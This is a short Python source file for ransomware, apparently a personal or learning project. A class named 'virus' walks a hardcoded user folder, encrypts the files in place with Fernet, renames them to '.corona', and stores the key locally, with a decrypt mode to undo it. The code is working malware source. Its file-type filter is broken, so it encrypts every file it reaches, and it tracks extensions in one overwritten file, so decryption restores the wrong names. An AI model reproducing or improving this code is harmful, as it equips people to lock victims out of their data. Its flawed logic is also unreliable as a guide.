from cryptography.fernet import Fernet
from pathlib import Path
import os
class virus:
    ty=['txt','mp3','corona']

    def __init__(self):
        self.local_root = r'C:\Users\Pratham\Documents\ransom\localroot'
        

    def write_key(self):
        self.key = Fernet.generate_key()
        with open("key.key","wb") as kf:
            kf.write(self.key)

    def load_key(self):
        return open("key.key","rb").read()

    def encrypt(self):
        #self.write_key()
        f=Fernet(self.key)
        with open(self.filename,"rb") as file:
            data=file.read()

        encrypted=f.encrypt(data)
        with open(self.filename,"wb") as file:
            file.write(encrypted)
    
        base = os.path.splitext(self.filename)[0]
        alti = os.path.splitext(self.filename)[1]
        with open ("extension.txt","w") as et:
            et.write(str(alti))
        os.rename(self.filename, base + '.corona')

    def decrypt(self):
        a = self.load_key()
        g=Fernet(a)
        with open(self.filename, "rb") as file:
            data_en = file.read()
        decrypted = g.decrypt(data_en)
        with open(self.filename, "wb") as file:
            file.write(decrypted) 
        base = os.path.splitext(self.filename)[0]
        with open ("extension.txt","r") as es:
            anti=es.read()
        os.rename(self.filename, base + anti)

    def path(self, ab):
        system = os.walk(self.local_root, topdown=True)
        for root, dir, files in system:
            for ty in files:
                self.filename=os.path.join(root, ty)
                if not self.filename.split('.')[-1] in ty:
                    continue
                if ab =='en':
                    self.encrypt()
                elif ab =='de':
                    self.decrypt()
                else:
                    print("wrong")
                    exit(1)


if __name__ == "__main__":
    rw = virus()
    #rw.write_key()
    c= input("new key :")
    if c =='y':
        rw.write_key()
    b = input("enter choice :")
    #print(a)
    #key = load_key()
    rw.path(b)

            
    



   


